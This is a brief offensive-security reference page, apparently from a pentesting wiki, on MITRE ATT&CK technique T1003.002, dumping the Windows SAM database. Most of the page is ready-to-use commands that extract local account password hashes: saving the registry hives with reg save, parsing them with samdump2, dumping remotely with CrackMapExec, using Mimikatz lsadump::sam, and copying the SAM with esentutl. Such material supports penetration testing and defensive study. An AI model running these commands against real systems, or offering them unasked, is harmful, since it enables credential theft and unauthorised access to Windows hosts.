---
description: MITRE ATT&CK, Credential Access, Sub-technique T1003.002
---

# Security Account Manager (SAM)

The Security Accounts Manager (SAM) is a database file in Windows that contains usernames and passwords for local accounts, typically those identified from the `net user` command.

The SAM is a database file that contains local accounts for the host, typically those found with the `net user` command.

```bash
# Manually extracting the SAM
reg save HKLM\sam sam
reg save HKLM\system system

# Analyzing extracted files
samdump2 system sam 

# Dumping the SAM remotely with CrackMapExec
crackmapexec smb $ip -u $username -p $password --sam

# Dumping the SAM with Mimikatz
mimikatz lsadump::sam    
```

It is also possible to [dump the SAM file via esentutl.exe](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe) which comes installed by default with Windows:

```bash
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
```

### References

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry" %}

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe" %}
